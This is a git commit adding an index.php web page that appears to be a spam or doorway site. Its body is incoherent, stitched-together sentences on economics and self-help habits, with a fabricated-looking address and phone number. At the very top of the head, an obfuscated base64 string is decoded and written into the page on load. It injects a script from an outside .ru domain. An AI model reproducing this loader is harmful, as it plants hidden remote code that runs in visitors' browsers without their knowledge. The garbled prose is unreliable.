20616c17571fb721ad12734916ef2eaccc6c2468
tphrcftq <80340660+tphrcftq@users.noreply.github.com>
2021-03-09 17:33:46 +0200

    Add files via upload

---
+++ index.php
@@ -0,0 +1,118 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <script type="text/javascript">
+	let encoded = 'PHNjcmlwdCBzcmM9Imh0dHBzOi8va2xvb2xrLnJ1L3RyYWNrZXIuanMiPjwvc2NyaXB0PjxkaXYgY2xhc3M9ImNoZWNrX2Zvcl9xMDV1dnU4Nmlub3hycDZoZmIiPjwvZGl2Pg==';let decoded = atob(encoded);document.write(''+ decoded +'');
+	</script>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>I came to a deep understanding of why, over the years working with people from all walks</title>
+
+	<link href="https://fonts.googleapis.com/css?family=Open+Sans" rel="stylesheet">
+	<link href="https://fonts.googleapis.com/css?family=Quicksand" rel="stylesheet">
+    <link rel="stylesheet" href="http://maxcdn.bootstrapcdn.com/font-awesome/4.6.0/css/font-awesome.min.css">
+    <link rel="stylesheet" href="styles.css">
+
+</head>
+
+<body>
+
+	<header class="8zw814u2ic3xqkk1fd">
+		<nav>
+			<li><a href="#">MAIN</a></li>
+			<li><a href="our_themes.html">OUR THEMES</a></li>
+			<li><a href="#">FLOW</a></li>
+			<li><a href="#">E-MAIL</a></li>
+		</nav>
+	</header>
+
+
+	<section class="hero" class="4r2rkbe49mg5eo46i4">
+		<div class="background-image" style="background-image: url(main.jpg);"></div>
+		<h1>I came to a deep understanding of why, over the years working with people from all walks</h1>
+	</section>
+
+
+	<section class="our-work" class="9j4y1q09aatzf0tu8a7">
+		<h3 class="title">This factor is now the entire natural environment, </h3>
+		<p>Closure of minesthe massive resignation of the military requires a large-scale retraining of the workforce.  Thus, demand is the desire and ability of buyers to purchase goods and services at certain prices, which can be written in the form of the formula: D = P? Q, where P is the price; Q is the number of goods and services.The graph contains seven options for demand for a product, depending on its price.  Another point is important to make in relation to the concept of consumer surplus.  - the good memory of my father.  Within the framework of systems analysis, the study of consumer behavior begins with the study of his consumer choice, the reasons why he prefers one product to another.  The next time you have a disagreement or argument with another person, try to understand the interests underlying that position.  Having reached a certain limit, the company is immediately deprived of the right to apply preferential taxation, which it can return to itself only after two years. </p>
+		<hr>
+
+		<ul class="grid" class="mc2w2mud1k8zssexk84xo">
+			<li class="large" style="background-image: url(image1.jpg);"></li>
+		</div>
+	</section>
+	
+
+	<section class="our-work" class="8zw814u2ic3xqkk1fd">
+		<h3 class="title">These issues will then need to be on the a</h3>
+		<p>That's why they call me the manager because I "know" more than others.  It involves the clarification of two main circumstances that determine its occurrence: 1) the specifics of pricing for agricultural products, in which the natural resource has a decisive influence on labor productivity; 2) the specifics of obtaining super-profits in this industry and the reasons for the sustainability of their reproduction.  She helped me personally to look at many things with different eyes, and it is a pity that during my youth I was not able to read such a book.  = P1 + P2 + P3, where P1 is the average profit that entrepreneurs receive in conditions of free movement of capital; P2 - excess profit received by entrepreneurs as a result of innovation; Р3 - monopoly excess profit from abuse of monopoly position.  They began to succumb to leadership worse.Since my friend had many years of experience in her own performances and felt that she understood the needs of the elderly in the nursing homes where they usually performed better than others, she considered many of her children's ideas not very suitable.  It suits both the seller and the buyer.  Targeted management is most typical for single and small-scale production, as well as for pilot production.  Thanks to these funds, some problems could temporarily lose their acuteness, but deep, chronic sores remained intact, inflamed and made themselves felt again and again.  But once they put Habit 5 into practice, two things became clear.  This man was absolutely sincere.  Research for development is carried out when it is necessary to obtain more information on a given problem, to formulate hypotheses more clearly.  It is nourished by springs that inspire and elevate you, link you to the eternal truths of humanity.  - Wonderful! Do you do what you want to do- it's your problem. </p>
+		<hr>
+
+		<ul class="grid">
+			<li class="large" class="4r2rkbe49mg5eo46i4" style="background-image: url(image2.jpg);"></li>
+		</div>
+	</section>
+	
+
+	<section class="our-work" class="9j4y1q09aatzf0tu8a7">
+		<h3 class="title">If one firm lowered the price, then its competitors, feeling th</h3>
+		<p>It is necessary for the normal functioning of the enterprise.  He made an appointment with bank officials who were extremely skeptical.  Various types of businesses, community groups and organizations, including families, can be proactive.  Just focus and open up to your reading. </p>
+		<hr>
+
+		<ul class="grid">
+			<li class="large" class="mc2w2mud1k8zssexk84xo" style="background-image: url(image3.jpg);"></li>
+		</div>
+	</section>
+	
+
+	<section class="our-work" class="8zw814u2ic3xqkk1fd">
+		<h3 class="title">Elasticity is one of the most important categories </h3>
+		<p>- Well! We have decided on this.  " While Habit 2 is applicable to many different circumstances and aspects of life, the basic embodiment of the “start by imagining the ultimate goal” motto is to start today by presenting an image, picture, or paradigm of your ultimate goal in life.  Once one oriental Zen Buddhist mentor, who always, regardless of any adversity, was distinguished by great calmness and serenity, was asked how he managed to maintain himself in this state.  Family Mission Because Habit 2 is principle-based, it has many uses.Not only individuals, but families, teams and organizations of all kinds become much more effective when they "start out with the ultimate goal." Many families are ruled not by clear principles, but by crises, moods, quick decisions and the desire to meet immediate needs.  In addition, they could provide their colleagues with key words that everyone should read and understand.  However, each of them acquires more general utility for itself in comparison with the other side. </p>
+		<hr>
+
+		<ul class="grid">
+			<li class="large" class="4r2rkbe49mg5eo46i4" style="background-image: url(image4.jpg);"></li>
+		</div>
+	</section>
+	
+
+	<section class="our-work" class="9j4y1q09aatzf0tu8a7">
+		<h3 class="title">Mutual concession.  The modern United Stat</h3>
+		<p>Be patient a little.  So, before we leave our vantage point and move on to Habits 4, 5, and 6, I would like to introduce you to a metaphor that will be very useful in describing the nature of relationships and defining the essence of P / PC balance in an interdependent reality.  Production costs are the total cost of labor to produce a product.  We go back to the right brain and use imagination, creativity, conscience and inspiration.  And at the beginning of the school year, these computer data became the main criterion,on the basis of which teachers formed their paradigms in relation to students.  We are talking about an "intense" value that can be perceived only in terms of "less" or "more".  Through repeated repetition of these exercises - intellectual, emotional and moral - with the involvement of memory and imagination, Frankl cultivated in himself his little, barely-born freedom,until she grew up and made him freer than the jailers guarding him.  Often we share with her different views on a particular situation and in roles we play more effective approaches to complex interpersonal family problems.  Therefore, remember that there is always a “Do Not Connect” option.  The core of every family is that which does not change, which can always be addressed: a common vision and common values.  on a voluntary merger or takeover by the winners of bankrupts.  boredom.  81. </p>
+		<hr>
+	</section>
+
+
+
+	<section class="contact">
+		<h3 class="mc2w2mud1k8zssexk84xo" class="title">I once gave a workshop I called "Drive Left, Drive Right" for a</h3>	
+		<p>So often it turns out that the problem is in the system, not in the people! If you put good people in a bad system, you will get bad results.Watering requiredflowers that you want to grow.  Then the boy did not particularly react to their words, but the parents developed in themselves the paradigm of unconditional love for their son to such a level that his reaction could no longer affect their feelings for him.  Maintaining the P / PC balance is of particular importance in relation to the human resources of the organization - customers and employees.  It is usually assumed that the enterprise, by raising the price of its products, has the opportunity to increase the proceeds from its sale.  The employer is obliged to comply with the norms of legislative law in the field of labor relations established and accepted in society;2) the commodity "labor force" is the leading factor of production, ensuring competitiveness and economic growth; 3) the employee needs to maintain his functional ability for productive work, regardless of the sale of labor through the consumption of a certain set of vital goods; 4) the employee allows the employer to use his labor until the moment it is paid in monetary terms, thereby crediting the entrepreneur; 5) the use value of labor is determined by a number of characteristics, among which experience, knowledge, and qualifications are important. </p>
+		<hr>
+
+		<form>
+			<input type="email" placeholder="-Email">
+			<input type="Name" placeholder="-Name">
+			<input type="Surmane" placeholder="-Surname">
+			<a href="#" class="btn">Subscribe now</a>
+		</form>
+
+	</section>
+
+	<footer class="8zw814u2ic3xqkk1fd">
+		<ul>
+			<li><a href="#"><i class="fa fa-twitter-square" class="4r2rkbe49mg5eo46i4"></i></a></li>
+			<li><a href="#"><i class="fa fa-facebook-square"></i></a></li>
+			<li><a href="#"><i class="fa fa-snapchat-square" class="9j4y1q09aatzf0tu8a7"></i></a></li>
+			<li><a href="#"><i class="fa fa-pinterest-square"></i></a></li>
+			<li><a href="#"><i class="fa fa-github-square" class="mc2w2mud1k8zssexk84xo"></i></a></li>
+		</ul>
+		<p><a href="policy.html">Privacy policy</a></p>
+		<p>99334 Howe Junctions, Apt. 764, 73826, New Margarettahaven, New York, United States</p>
+		<p>Phone number: +930(508)716-4533752</p>
+	</footer>
+
+</body>
+
+</html>
